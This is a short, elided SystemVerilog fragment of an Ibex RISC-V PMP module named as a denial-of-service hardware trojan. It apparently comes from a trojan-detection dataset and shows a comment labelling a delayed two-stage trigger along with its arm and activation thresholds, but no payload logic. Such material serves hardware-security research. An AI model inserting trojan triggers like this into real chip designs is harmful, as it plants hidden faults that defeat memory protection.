...
module ibex_pmp_trojan_DoS import ibex_pkg::*; #(
  ...
  function automatic logic access_fault_check (logic                     csr_pmp_mseccfg_mmwp,
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=9694, act=4847)
    // ============================================================
    localparam int ARM_THRESHOLD   = 9694;
    localparam int ACTIVATE_DELAY  = 4847;
